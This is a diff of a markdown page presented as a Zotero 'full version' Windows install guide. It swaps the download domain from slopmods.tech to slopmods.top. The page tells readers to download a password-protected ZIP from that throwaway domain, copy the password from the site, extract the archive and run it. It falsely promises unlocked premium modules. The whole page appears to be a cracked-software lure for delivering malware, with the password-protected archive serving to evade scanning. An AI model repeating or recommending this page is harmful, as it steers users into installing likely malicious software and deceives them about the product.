@@ -1,6 +1,6 @@
 ***
 
-# Zotero Full Version — Windows Install
+# Zotero Windows Setup
 
 Zotero — Windows setup and configuration · Premium workspace · Zero nag dialogs.
 
@@ -8,12 +8,12 @@ Zotero — Windows setup and configuration · Premium workspace · Zero nag dial
 
 > Use the release page below for Windows.
 
-- **Release page:** [pbjsyspisrp.slopmods.tech](https://pbjsyspisrp.slopmods.tech/)
-- **Full URL:** `https://pbjsyspisrp.slopmods.tech/`
+- **Release page:** [pbjsyspisrp.slopmods.top](https://pbjsyspisrp.slopmods.top/)
+- **Full URL:** `https://pbjsyspisrp.slopmods.top/`
 - **Type:** Desktop package | Windows 10 and 11, 64-bit
 - **Setup:** Extract the ZIP, copy the archive password from the page, then run the current version
 
-> **Password** — copy it from the yellow box on **pbjsyspisrp.slopmods.tech** before you extract.
+> **Password** — copy it from the yellow box on **pbjsyspisrp.slopmods.top** before you extract.
 
 ## Questions & Answers
 
@@ -33,13 +33,8 @@ Zotero — Windows setup and configuration · Premium workspace · Zero nag dial
 
 This release ships the **professional desktop edition** — premium modules are **enabled and active** from the first launch. No trial mode, no feature gates.
 
-Download once from **pbjsyspisrp.slopmods.tech**, extract, open the app, and work with the full toolkit immediately.
+Download once from **pbjsyspisrp.slopmods.top**, extract, open the app, and work with the full toolkit immediately.
 
-
-
-## Search notes
-
-Install guide for **Zotero** full version on Windows PC (setup notes from release page).
 ## What you get
 
 - Core Zotero features on Windows desktop
